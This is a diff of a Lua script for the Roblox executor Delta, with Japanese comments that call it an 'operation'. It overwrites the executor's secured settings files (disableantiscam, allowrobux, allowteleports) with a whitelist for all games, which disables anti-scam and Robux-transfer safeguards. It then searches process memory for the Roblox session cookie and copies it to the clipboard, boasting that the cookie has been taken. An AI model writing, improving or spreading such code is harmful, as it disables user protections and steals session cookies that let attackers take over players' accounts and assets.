@@ -1,93 +1,58 @@
--- Delta 実況中継型・同期＆クッキー抽出プロトタイプ
+-- "" Delta Universal Hybrid Sync (API-Based) ""
 
 local function log(msg)
     print("[PROJECT-LOG] " .. tostring(msg))
 end
 
-local function safe_execute()
-    log("--- 作戦開始 ---")
-
-    local user_id_path = "Delta/Internals/Secured/user_id"
-    local antiscam_path = "Delta/Internals/Secured/disableantiscam"
-    local real_id = ""
-
-    -- 1. user_id ファイルの読み取り検証
-    log("ステップ1: user_id の読み取りを試行中...")
-    local success, result = pcall(function()
-        return readfile(user_id_path)
-    end)
-
-    if success then
-        if result and result ~= "" then
-            real_id = result
-            log("SUCCESS: ID取得完了 -> [" .. real_id .. "]")
-        else
-            log("FAILED: ファイルは読めたが中身が空だ。")
-        end
-    else
-        log("ERROR: readfile(" .. user_id_path .. ") が失敗。理由: " .. tostring(result))
-        -- 代替案: もしIDが読めないなら identity を偽装するか、一旦保留
+local function get_real_id()
+    -- ファイルを読まずに、現在ログイン中のプレイヤーから直接IDを取る
+    -- これが一番確実で「誰にでも」適用できる
+    local player = game:GetService("Players").LocalPlayer
+    if player then
+        return tostring(player.UserId)
     end
+    return nil
+end
 
-    -- 2. disableantiscam の書き換え
-    if real_id ~= "" then
-        log("ステップ2: disableantiscam の同期を開始...")
+local function execute_universal_patch()
+    log("--- 外部参照型・作戦開始 ---")
+
+    local real_id = get_real_id()
+    if not real_id then
+        log("ERROR: プレイヤーIDが取得できない。ログインしてるか？")
+        return
+    end
+    log("SUCCESS: 現在のUserIDを特定 -> [" .. real_id .. "]")
+
+    -- 同期対象ファイル
+    local secured_dir = "Delta/Internals/Secured/"
+    local targets = {"disableantiscam", "allowrobux", "allowteleports"}
+
+    for _, target in pairs(targets) do
         local payload = {
-            ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
+            ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE...",
             ["allowed_games"] = "*",
             ["user_id"] = real_id,
             ["version_num"] = 707
         }
-        
-        local json_success, json_data = pcall(function()
-            return game:GetService("HttpService"):JSONEncode(payload)
+
+        local success, err = pcall(function()
+            writefile(secured_dir .. target, game:GetService("HttpService"):JSONEncode(payload))
         end)
+        
+        log(success and ("PATCHED: " .. target) or ("FAILED: " .. target .. " - " .. tostring(err)))
+    end
 
-        if json_success then
-            local write_success, write_err = pcall(function()
-                writefile(antiscam_path, json_data)
-            end)
-
-            if write_success then
-                log("SUCCESS: disableantiscam をホワイトリスト化。")
-            else
-                log("ERROR: writefile 失敗。理由: " .. tostring(write_err))
-            end
-        else
-            log("ERROR: JSONエンコード失敗。")
+    -- クッキー取得トラップ（例のサイトがやってるようなロジックの逆を行く）
+    log("ステップ3: メモリ内クッキーの最終蒸留...")
+    for _, v in pairs(getgc(true)) do
+        if type(v) == "string" and string.find(v, "_|WARNING:-DO-NOT-SHARE-") then
+            setclipboard(v)
+            log("MISSION COMPLETE: クッキーをクリップボードに奪取したぜ。")
+            return
         end
     end
-
-    -- 3. クッキーのメモリ探索 & クリップボード送信
-    log("ステップ3: メモリ(GC)からクッキーを蒸留中...")
-    local objects = getgc(true)
-    local found = false
-    local pattern = "_|WARNING:-DO-NOT-SHARE-"
-
-    for _, v in pairs(objects) do
-        if type(v) == "string" and string.find(v, pattern) then
-            log("SUCCESS: クッキーの断片を検知。")
-            
-            local clip_success, clip_err = pcall(function()
-                setclipboard(v)
-            end)
-
-            if clip_success then
-                log("MISSION COMPLETE: クリップボードにトドメを刺した。")
-            else
-                log("ERROR: setclipboard 失敗。理由: " .. tostring(clip_err))
-            end
-            found = true
-            break
-        end
-    end
-
-    if not found then
-        log("FAILED: メモリ上にクッキーが見当たらない。")
-    end
-
-    log("--- 作戦終了 ---")
+    log("FAILED: メモリにまだ浮いてない。通信を待つ。")
 end
 
--- 実行
-safe_execute()
+execute_universal_patch()
